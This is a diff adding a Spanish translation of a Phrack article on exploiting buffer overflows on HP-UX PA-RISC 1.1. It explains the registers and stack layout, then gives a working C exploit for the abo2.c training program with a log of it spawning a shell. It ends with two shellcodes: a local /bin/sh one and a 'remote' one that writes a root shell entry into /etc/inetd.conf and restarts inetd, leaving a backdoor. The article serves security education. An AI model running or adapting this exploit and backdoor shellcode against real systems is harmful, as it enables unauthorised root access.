@@ -1,0 +1,660 @@
+
+                             ==Phrack Inc.==
+
+             Volumen 0x0b, Numero 0x3a, Archivo #0x0b de 0x0e
+
+|=-----------------=[ HP-UX (PA-RISC 1.1) Overflows ]=-------------------=|
+|=-----------------------------------------------------------------------=|
+|=----------------=[ Zhodiac  <zhodiac@softhome.net> ]=------------------=|
+
+
+--[ Introduccion.
+
+
+  Que mierda, otro documento sobre buffer overflow!! Bueno, este texto no
+intenta explicar las exploitaciones buffer overflow, tampoco intenta
+explicar programacion asm. Este texto se focaliza principalmente en tres
+temas:
+
+  Los registros y organizacion de la pila de HP-UX/PA-RISC, una solucion
+para abo2.c (ubicado en community.core-sdi.org/~gera/InsecureProgramming/)
+y finalmente dos shellcodes para este SO/arch.
+
+  Cubre temas basicos para empezar con exploiting buffer overflow bajo
+HP-UX/PA-RISC 1.1. Este texto esta dividido en las siguientes secciones:
+
+
+  1. Introduccion a PA-RISC
+    1.1. Fundamentales de RISC
+    1.2. Registros
+    1.3. Funciones leaf y no-leaf
+  2. Organizacion de la pila
+  3. Advance Buffer Overflow #2
+  4. Extras
+    4.1. Shellcode Local
+    4.2. Remote Shellcode
+  5. Recursos
+  6. Saludos
+  
+
+--[ 1. Introduccion a PA-RISC
+
+--[ 1.1. Fundamentales de RISC
+
+  RISC (Reduced Set Computing) se refiere a procesadores con un set de
+instrucciones reducido, y con la habilidad de hacer las mismas tareas
+que un procesador CISC (Complex Set Computing).
+
+Los procesadores RISC tienen algunas caracteristicas comunes:
+
+  - Carga, dise~o de reserva para acceso a memoria
+  - Reducido numero de direcciones
+  - El tama~o de la instruccion es siempre el mismo (acelera)
+  - Pocos formatos de instrucciones
+  - Mas uso de registros que de memoria
+  
+Mas profundamente en PA-RISC arch tenemos algunas caracteristicas mas
+definidas:
+
+   - Direccionamiento inmediato, base relativa sin offset
+   - Predecremento en una instruccion
+   - Postincremento en una instruccion
+   - 12 formatos de instruccion, todos tienen 32 bits
+   
+   
+--[ 1.2. Registros
+
+En PA-RISC 1.1 hay cuatro tipos de registros:
+
+  - Registros generales (32)
+  - Registros de punto flotante (32)
+  - Registros de espacio (8)
+  - Registros de control (25)
+  
+  
+  Nos focalizaremos en los "Registros Generales" que son los unicos que
+tienen que ver con la programacion de shellcodes y exploiting buffer
+overflow. Estos registros pueden ser usados en cualquier momento aun si
+la cpu no esta en estado privilegiado, excepto %gr0 (%r0) como veremos.
+
+Expliquemos algunos usos de los registros generales
+
+  - %gr0: Siempre contiene el valor 0 y si escribes algo en el, sera
+          descartado
+  - %gr1: Es registro implicito objetivo de la instruccion ADDIL.
+  	  Cuando se llama a una funcion shared libray almacenara la
+  	  direccion de retorno de la tan nombrada "shared library stub"
+  	  antes de llamar a la funcion.
+  - %gr2 (%rp): La direccion de retorno es guardada en el registro
+          cuando una function call es terminada con BL (Branch and Link)
+  - %gr3-%gr21: registros de uso general
+  - %gr19: es la tabla de linkamiento de registro base cuando se llama
+          a una funcion de shared library.
+  - %gr22: almacena el numero de syscall cuando vas a llamar a alguno
+          de ellos.
+  - %gr23-gr26: almacena los argumentos de las funciones arg0-arg3
+  - %gr28,gr29 (%ret, %ret1): En %gr28 es guardado el valor de retorno
+          de una funcion o syscall. (Un valor inmediato o una direccion
+          de referencia). Bajo ciertas circunstancias el valor es
+          guardado en %gr29
+  - %gr30: Aqui es guardado el actual Stack pointer (puntero de la pila).
+  	  No tiene que ser alineado a 16 bits.
+  - %gr31: bajo PA-RISC 2.0 contiene la direccion de retorno cuando una
+  	  instruccion BLE es ejecutada.
+  	 
+Algunas notas finales:
+
+  - Bajo PA-RISC 2.0 el tama~o de los registros es 64 bits.
+  
+  
+--[ 1.3. Funciones leaf y no leaf
+
+Hay dos clases de funciones principales bajo HP-UX (similares a las de
+SPARC):
+
+  - Funciones Leaf: NO llaman a ninguna funcion distante.
+  
+  Las funciones leaf, ya que no llaman a ninguna funcion distante
+nunca guardan %rp en memoria porque nunca seria sobreescrito por una
+nueva funcion llamada.
+
+Aqui hay un ejemplo en codigo y su gdb dissas dump en una funcion leaf.
+
+HP9000:~/overflows/leaf$ cat leaf.c 
+
+int leaf(char *buff) {
+  int a=0;
+  a=1;
+}
+
+int main(int argc, char **argv) {
+  leaf(argv[1]);
+}
+
+HP9000:~/overflows/leaf$
+
+Puedes ver que en el gdb disass dump nunca guarda %rp en la pila.
+
+(gdb) disass leaf
+Dump of assembler code for function foo:
+0x3280 <leaf>:           copy r3,r1
+0x3284 <leaf+4>:         copy sp,r3
+0x3288 <leaf+8>:         stw,ma r1,40(sr0,sp)
+0x328c <leaf+12>:        stw r26,-24(sr0,r3)
+0x3290 <leaf+16>:        stw  r0,8(sr0,r3)
+0x3294 <leaf+20>:        ldi 1,r19
+0x3298 <leaf+24>:        stw  r19,8(sr0,r3)
+0x329c <leaf+28>:        ldo 40(r3),sp
+0x32a0 <leaf+32>:        ldw,mb -40(sr0,sp),r3
+0x32a4 <leaf+36>:        bv,n r0(rp)
+End of assembler dump.
+(gdb)
+
+
+  - Funciones No-leaf: SI llaman al menos una funcion.
+  
+  Las funciones No-leaf, ya que no llaman a ninguna funcion distante
+siempre guardan %rp en la pila (como veremos) porque la funcion llamada
+va a sobreescribir %rp con su puntero de retorno wn.
+
+Aqui hay un ejemplo en codigo y su gdb dissas dump de una funcion leaf.
+
+HP9000:~/overflows/non-leaf$ cat non-leaf.c
+  
+int non_leaf(char *buff) {
+  int a=0;
+  a=1;
+  sleep(1);
+}
+
+int main(int argc, char **argv) {
+  non_leaf(argv[1]);
+}
+
+HP9000:~/overflows/non-leaf$
+
+Puedes ver que en el gdb disass dump guarda %rp en la pila en
+"stw rp,-14(sr0,sp)".
+
+(gdb) disass non_leaf
+Dump of assembler code for function foo:
+0x32b0 <non_leaf>:           stw rp,-14(sr0,sp)
+0x32b4 <non_leaf+4>:         copy r3,r1
+0x32b8 <non_leaf+8>:         copy sp,r3
+0x32bc <non_leaf+12>:        stw,ma r1,80(sr0,sp)
+0x32c0 <non_leaf+16>:        stw r26,-24(sr0,r3)
+0x32c4 <non_leaf+20>:        stw  r0,8(sr0,r3)
+0x32c8 <non_leaf+24>:        ldi 1,r19
+0x32cc <non_leaf+28>:        stw  r19,8(sr0,r3)
+0x32d0 <non_leaf+32>:        ldi 1,r26
+0x32d4 <non_leaf+36>:        b,l 0x3298 <sleep>,rp
+0x32d8 <non_leaf+40>:        nop
+0x32dc <non_leaf+44>:        ldw -14(sr0,r3),rp
+0x32e0 <non_leaf+48>:        ldo 40(r3),sp
+0x32e4 <non_leaf+52>:        ldw,mb -40(sr0,sp),r3
+0x32e8 <non_leaf+56>:        bv,n r0(rp)
+0x32ec <non_leaf+60>:        break 0,0
+End of assembler dump.
+(gdb)
+
+
+--[ 2. Organizacion de la Pila
+
+  La siguiente organizacion de la pila es llevada a cabo bajo PA-RISC
+en un HP-UX B10.20 y usando el compilador gcc (aunque explicare algunas
+funciones del cc nativo). No he visto ninguna documentacion sobre este
+tema, por lo que esta basado en gdb y mi habilidad de deduccion.
+
+  PA-RISC no tiene instrucciones como "save", "restore" para salvar los
+valores de los registros en una function prelude como lo hace SPARC,
+todo este tema es implementado via software y cambios entre compiladores.
+
+  Nos focalizaremos en una funcion no-leaf que son las unicas que tienen
+que ver con buffer overflows. Todas las funciones "no-leaf" implementan
+un prelude y un final de una funcion, por ejemplo en main():
+
+
+
+        0x3380 <main>:          stw rp,-14(sr0,sp)
+        0x3384 <main+4>:        copy r3,r1
+        0x3388 <main+8>:        copy sp,r3
+        0x338c <main+12>:       stw,ma r1,40(sr0,sp)
+        0x3390 <main+16>:       stw r26,-24(sr0,r3)
+        0x3394 <main+20>:       stw r25,-28(sr0,r3)
+
+        ...
+
+        0x33e0 <main+96>:       ldw -14(sr0,r3),rp
+        0x33e4 <main+100>:      ldo 40(r3),sp
+        0x33e8 <main+104>:      ldw,mb -40(sr0,sp),r3
+        0x33ec <main+108>:      bv,n r0(rp)
+
+
+        Vamos a ver paso por paso que esta pasando:
+        
+  - 0x3380 <main>:          stw rp,-14(sr0,sp)
+
+    Guarda la direccion de retorno (en %rp despues del BL) en %sp-0x14.
+    El compilador C Nativo la guarda en %sp-0x18.
+
+  - 0x3384 <main+4>:        copy r3,r1
+ 
+    Hace una copia de %r3 en %r1. Esto es porque en %r3 guardaremos el
+    %sp de la funcion previa, como veremos.
+       
+  - 0x3388 <main+8>:        copy sp,r3
+
+    Copia %sp en %r3.
+
+  - 0x338c <main+12>:       stw,ma r1,40(sr0,sp)
+
+    Guarda %r1 (el sp a las back functions) en la pila e incrementa
+    %sp en 0x40. Este 0x40 es porque reserva espacio para sus propias
+    variables locales mas 64 bytes para el frame maker y los argumentos
+    de la siguiente funcion (Notar que el frame maker es de la siguiente
+    funcion que esta por ser llamada, esto es muy importante!)
+    
+  - 0x3390 <main+16>:       stw r26,-24(sr0,r3)
+
+    Copia el primer argumento (%r26) de la funcion a la pila (espacio
+    reservado de la ultima funcion), en %r3 (ultimo %sp) - 0x24.
+    
+  - 0x3394 <main+20>:       stw r25,-28(sr0,r3)
+    
+    Copia el segundo argumento (%r25) de la funcion a la pila (espacio
+    reservado de la ultima funcion), en %r3 (ultimo %sp) - 0x28
+    
+    Como el mecanismo de las ultimas dos instrucciones, los primeros
+    cuatro argumentos seran guardados (%r26-%r23). En caso de que haya
+    mas de cuatro argumentos antes de que el jmp a la funcion se haya
+    hecho, seran guardados en la pila donde calzan.
+    
+    P.e.   arg4 ---> %r3 - 52
+           arg5 ---> %r3 - 56
+           arg6 ---> %r3 - 60
+           ...
+
+  Entonces la organizacion de la pila se vera asi:
+  
+
+                 |                         |
+                 --------------------------- %sp    \
+                 |                         |        |
+                 |                         |        |
+                 |                         |        | 
+                 |                         |        | 
+                 |                         |        |
+                 |                         |        | Espacio reservado  
+                 |                         |        | para el Frame Maker
+                 |                         |        | y los argumentos
+                 |                         |        | de la siguiente
+                 |                         |        | funcion.
+                 |                         |        | Siempre 64 bytes.
+                 |                         |        | 
+                 |                         |        | 
+                 |                         |        |
+                 |                         |        |
+                 |                         |        |
+                 ---------------------------       /
+                 |                         |       \
+                 |                         |        | Espacio reservado para
+                             ...                    | las variables locales
+                 |                         |        | de la funcion
+                 |                         |        | + 4 bytes (%r1) 
+                 |           %r1           |       /
+                 --------------------------- %r3   \
+         -4      |                         |        |
+         -8      |                         |        |
+         -12     |                         |        | Frame Maker de la
+         -16     |                         |        | funcion actual
+         -20     |       %r2 (%rp) gcc     |        | 
+         -24     |       %r2 (%rp) cc      |        |
+         -28     |                         |        |
+         -32     |                         |       /
+         -36     |       arg1 = %r26       |       \
+         -40     |       arg2 = %r25       |        |
+         -44     |       arg3 = %r24       |        | Espacio reservado
+         -48     |       arg4 = %r23       |        | para los argumentos 
+         -52     |       arg5              |        | de la funcion
+         -56     |       ...               |        | actual
+         -60     |                         |        | 
+         -64     |                         |        |
+                 ---------------------------       /
+                 |                         |
+
+  Con esta informacion util, si un buffer overflow ocurre en el stack y
+overfloweamos una variable local de una funcion, sobreescribiremos el
+Frame Maker de la funcion siguiente llamada. Esa 'funcion siguiente'
+solia ser la funcion que hace la copia del buffer, p.e. strcpy(),
+sprintf() etc.
+
+  Este es el por que de que el siguiente programa no puede ser
+exploiteado porque no hay una 'funcion siguiente' que copie el buffer,
+porque nosotros copiamos el buffer con un while.
+
+
+  void vulnerable_func(char *buffer) {
+  char buffer2[128];
+  int counter=0;
+
+     while(buffer[counter]!='\0') {
+      buffer2[counter]=buffer[counter];
+      counter++;
+     }
+
+   printf("Buffer: %s\n",buffer);
+  }
+
+  int main(int argc, char **argv) {
+
+   vulnerable_func(argv[1]);
+  }
+
+
+  En la ultima parte de cada funcion deshacemos todas las operaciones que
+hemos visto: leer %rp de la pila, restaurar %sp y %r3 y ramas (branches)
+a %rp.
+
+
+--[ 3. Advanced Buffer Overflow #2
+
+En la siguiente pagina web:
+
+  http://community.core-sdi.com/~gera/InsecureProgramming/
+
+hay algunos programas vulnerables a varios tipos de bugs como buffer
+overflow, heap overflow, format string bugs, ...
+
+  Nos focalizaremos en Advance Buffer Overflow #2 (abo2.c) que da dolores
+de cabeza a mucha gente.
+
+
+HP9000:~/overflows/sample$ cat abo2.c
+/* abo2.c                                                    *
+ * specially crafted to feed your brain by gera@core-sdi.com */
+
+/* This is a tricky example to make you think                *
+ * and give you some help on the next one                    */
+
+ int main(int argv,char **argc) {
+    char buf[256];
+
+    strcpy(buf,argc[1]);
+    exit(1);
+    } 
+HP9000:~/overflows/sample$
+
+  Mucha gente dice que "su exploitacion no es posible". Yo voy mas alla
+diciendo "su exploitacion no es posible en arquitecturas x86", pero en
+otras como PA-RISC puede ser exploitable.
+
+  En plataformas x86, proveyendo un buffer suficiente largo,
+sobreescribiras la direccion de retorno de main(), pero debido al
+ineludible exit() no tendremos nunca el control del flujo del programa
+vulnerable. Es mejor decir "No llego a tener el control de eso :P"
+
+  Tenemos que encontrar una forma de controlar el flujo de nuestro
+programa antes de que exit() sea ejecutado. Bajo HP-UX10.20/PA-RISC,
+ya que la pila (%r30 o %sp) crece de la direccion mas baja a la mas alta
+(contra algunas otras arquitecturas que lo hacen como Linux x86) y
+debido tambien a la organizacion de la pila explicada en este documento,
+no sobreescribiremos la direccion de retorno de strcpy(). Por lo que una
+vez que el buffer es copiado, y una vez que strcpy se ramifica a su 
+propio %rp, ira a nuestro shellcode teniendo control del flujo del
+programa antes de que exit() sea ejecutado.
+
+  Todo esto es debido a que strcpy(), es implementado, bajo HP-UX B.10.20
+como una funcion no-leaf (guardara su propio puntero de retorno en la
+pila). Fyodor Yarochkin me dijo que strcpy() bajo HP-UX 11.00 es
+implementado como una funcion leaf, por lo que este overflow en 
+particular no podra ser exploitable en esa version de HP-UX.
+
+  No estoy diciendo que los overflow strcpy()'s no sean posible de 
+exploitear bajo HP-UX 11.00. Echa una mirada a este pieza de codigo y
+averigua por que puede seguir siendo posible.
+
+HP9000:~/overflows/hp11-strcpy$ cat hp11-strcpy.c  	
+void foo(char *buff,char *dest) {
+  strcpy(dest,buff);
+}
+
+int main(int argc, char **argv) { 
+  char buffer[128];
+
+  foo(argv[1],buffer);
+}
+HP9000:~/overflows/hp11-strcpy$
+
+
+Concepto de Prueba:
+
+HP9000:~/overflows/sample$ uname -a
+HP-UX HP9000 B.10.20 A 9000/712 2013496278 two-user license 
+HP9000:~/overflows/abo2$ cat abo2.c
+/* abo2.c                                                    *
+ * specially crafted to feed your brain by gera@core-sdi.com */
+  
+/* This is a tricky example to make you think                *
+ * and give you some help on the next one                    */
+ 
+ int main(int argv,char **argc) {
+    char buf[256];
+     
+    strcpy(buf,argc[1]);  
+    exit(1);
+    }
+HP9000:~/overflows/abo2$
+
+HP9000:~/overflows/abo2$ cat xploit.c
+/*
+ * abo2.c xploit by Zhodiac <zhodiac@softhome.net>
+ *
+ * http://community.core-sdi.com/~gera/InsecureProgramming/  
+ * 
+ * Xploited on HPUX
+ * 9/9/2001
+ * 
+ * Madrid
+ *
+ */
+#include <stdio.h>
+    
+//#define NOP 0x3902800b
+#define NOP 0x08630243
+#define BUFFSIZE 256+48+1 
+#define NUMADDR 10
+#define OFFSET -80
+  
+char shellcode[] =
+"\xe8\x3f\x1f\xfd\x08\x21\x02\x80\x34\x02\x01\x02\x08\x41\x04\x02\x60\x40"
+"\x01\x62\xb4\x5a\x01\x54\x0b\x39\x02\x99\x0b\x18\x02\x98\x34\x16\x04\xbe"
+"\x20\x20\x08\x01\xe4\x20\xe0\x08\x96\xd6\x05\x34\xde\xad\xca\xfe"
+"/bin/sh\xff";
+
+long get_sp(void) {
+   __asm__("copy %sp,%ret0 \n");
+}
+  
+int main(int argc, char *argv[]) {
+char buffer[BUFFSIZE];
+char *ch_ptr;
+unsigned long addr,offset=OFFSET;
+int aux;
+
+ if (argc==2) offset=atoi(argv[1]);
+
+ addr=get_sp()+offset;
+
+ memset(buffer,0,sizeof(buffer));
+ ch_ptr=(char *)buffer;
+
+ for (aux=0; aux<(BUFFSIZE-strlen(shellcode)-NUMADDR*4)/4; aux++) {
+      *(ch_ptr++)=(NOP>>24)&255;
+      *(ch_ptr++)=(NOP>>16)&255;
+      *(ch_ptr++)=(NOP>>8)&255;
+      *(ch_ptr++)=NOP&255;
+      }
+
+ memcpy(ch_ptr,shellcode,strlen(shellcode));
+ ch_ptr+=strlen(shellcode);
+ for (aux=0; aux<NUMADDR; aux++) {
+     *(ch_ptr++)=(addr>>24)&255;
+     *(ch_ptr++)=(addr>>16)&255;   
+     *(ch_ptr++)=(addr>>8)&255;
+     *(ch_ptr++)=addr&255;
+     }
+ 
+ buffer[BUFFSIZE-1]='\0';
+ printf("Return Address %#x\n",addr);
+ printf("Buffer Size: %i\n",strlen(buffer));
+      
+ if (execl("./abo2","abo2",buffer,NULL)==-1) {
+    printf("Error at execl()\n");
+    exit(-1);
+    }  
+
+}
+HP9000:~/overflows/abo2$ 
+ 
+HP9000:~/overflows/abo2$ gcc -o xploit xploit.c
+HP9000:~/overflows/abo2$ gcc -o abo2 abo2.c
+     
+HP9000:~/overflows/abo2$ ./xploit
+Return Address 0x7b03a5b0
+Buffer Size: 304
+$ uname -a
+HP-UX HP9000 B.10.20 A 9000/712 2013496278 two-user license
+$ exit
+HP9000:~/overflows/abo2$
+
+
+--[ 4. Extras
+
+  Hay dos shellcodes para HP-UX. Primero es uno local, que solo ejecuta
+un /bin/sh pero nota su tama~o reducido, solo 47 bytes. El segundo fue,
+en su tiempo de desarrollo, el primer shellcode remoto que conozco. Usa
+inetd para poner un shell en un puerto tcp. Hay un tercer shellcode que
+implementa todas las syscalls socket(), bind(), dup2() pero lo perdi.
+Suele pasar (Tambien fsck lo hace). :(
+
+
+--[ 4.1. Shellcode Local
+
+  Hoy en dia hay algunos HP-UX shellcodes (Fyodor's home desarrollo
+algunos y lsd-pl algunos mas), pero en su tiempo de desarrollo el unico
+publico fue el K2 de ADM. Este shellcode esta un poco optimizado, porque
+es 13 bytes mas chico en taman~o.
+
+
+/*
+ * HP-UX 47 bytes shellcode
+ *
+ *    By Zhodiac <zhodiac@softhome.net>
+ *
+ * Madrid, 13/05/2001
+ *
+ */
+
+
+char shellcode[]=
+"\xe8\x3f\x1f\xfd"      /*              bl salto,%r1               */
+"\x0b\x39\x02\x99"      /* salto:       xor %r25,%r25,%r25         */
+"\x34\x02\x04\xc0"      /*              ldi 0x260,%r2              */
+"\x08\x41\x04\x03"      /*              sub %r1,%r2,%r3            */
+"\x60\x79\x05\x08"      /*              stb %r25,0x284(%sr0,%r3)   */
+"\xb4\x7a\x04\xfa"      /*              addi 0x27D,%r3,%r26        */
+"\x0b\x18\x02\x98"      /*              xor %r24,%r24,%r24         */
+"\x20\x20\x08\x01"      /*              ldil L'0xC0000004,%r1      */
+"\xe4\x20\xe0\x08"      /*              ble R'0xC0000004(%sr7,%r1) */
+"\x94\x56\x05\x36"      /*              subi 0x29b,%r2,%r22        */
+"/bin/sh";
+
+
+--[ 4.2. Remote Shellcode
+
+/*
+ * HP-UX remote shellcode
+ *
+ *    By Zhodiac <zhodiac@softhome.net>
+ *
+ * Madrid, 14/05/2001
+ *
+ */
+
+char shellcode[]=
+"\xe8\x3f\x1f\xfd"      /*              bl salto,%r1               */
+"\x0b\x39\x02\x99"      /* salto:       xor %r25,%r25,%r25         */
+"\x34\x02\x04\xc0"      /*              ldi 0x260,%r2              */
+"\x08\x41\x04\x03"      /*              sub %r1,%r2,%r3            */
+"\x60\x79\x05\x78"      /*              stb %r25,0x2BC(%sr0,%r3)   */
+"\x60\x79\x05\x7e"      /*              stb %r25,0x2BF(%sr0,%r3)   */
+"\x68\x79\x05\x62"      /*              stw %r25,0x2AE(%sr0,%r3)   */
+"\xb4\x7a\x05\x6A"      /*              addi 0x2B5,%r3,%r26        */
+"\x0f\x5a\x12\x81"      /*              stw %r26,-16(%sr0,%r26)    */
+"\x94\x44\x04\xd0"      /*              subi 0x268,%r2,%r4         */
+"\x0b\x44\x06\x04"      /*              add %r4,%r26,%r4           */
+"\x0f\x44\x12\x89"      /*              stw  %r4,-12(%sr0,%r26)    */
+"\x94\x44\x04\xd6"      /*              subi 0x26C,%r2,%r4         */
+"\x0b\x44\x06\x04"      /*              add %r4,%r26,%r4           */
+"\x0f\x44\x12\x91"      /*              stw  %r4,-8(%sr0,%r26)     */
+"\xb7\x59\x07\xe1"      /*              addi -16,%r26,%r25         */
+"\x0b\x18\x02\x98"      /*              xor %r24,%r24,%r24         */
+"\x20\x20\x08\x01"      /*              ldil L'0xC0000004,%r1      */
+"\xe4\x20\xe0\x08"      /*              ble R'0xC0000004(%sr7,%r1) */
+"\x94\x56\x05\x36"      /*              subi 0x29b,%r2,%r22        */
+"AAAA"
+"BBBB"
+"CCCC"
+"ZZZZ"
+"/bin/sh -c echo \"eklogin stream tcp nowait root /bin/sh sh -i\" >> "
+"/etc/inetd.conf ; /usr/sbin/inetd -c ; ";
+
+
+--[ 5. Referencias
+
+Para mas informacion puedes consultar:
+
+ [1]  Algunos PDFs que encontre en http://www.freelsd.net/~ndubee/ (Gran 
+      coleccion :) y http://docs.hp.com/
+      * PA-RISC 1.1 Architecture and Instruction Set Reference Manual
+      * PA-RISC Architecture and Instruction Set Reference Manual
+      * http://www.devresource.hp.com/partner/rad.10.20.pdf
+      * http://www.devresource.hp.com/partner/rad.11.0.32.pdf
+
+ [2]  PA-RISC 2.0 Architecture
+      Gerry Kane
+      ISBN 0-13-182734-0
+
+ [3]  Buffer overflow on non-intel platforms (BlackHat 2001 Asia) 
+      Fyodor Yarochkin. 
+      http://www.notlsd.net/bof/index.html
+
+ [4]  lsd-pl HP-UX shellcodes (Uds gente, son realmente buenos! Espero 
+      poder hablar con uds en el futuro!)
+      http://lsd-pl.net
+
+ [5]  Pueden enviarme mails con cualquier duda que tengan :) 
+      Zhodiac <zhodiac@softhome.net>
+
+
+--[ 6.- Saludos
+
+     - [CrAsH], sin su soporte este documento no existiria. :***
+     - DarkCode por la larga larga charla acerca de SPARC y PA-RISC 
+          archs :)
+     - Fyodor Yarochkin por los pocos, pero geniales, chats que tuvimos 
+          acerca de PA-RISC. Por la revision de este texto. Thx. 
+     - El Nahual por divertirnos en la vida real y cibernetica ;P
+       Te debo un mail.
+     - 0xdeadcafe mail-list por los geniales temas de discusion.
+
+
+Madrid 11/10/2001
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
+
+ Traducido por Active Matrix - ActiveMatrix@technologist.com
+ Para RareGaZz - http://raregazz.cjb.net
+ Argentina, 2002
+ El articulo aqui traducido, mantiene los derechos de autor.
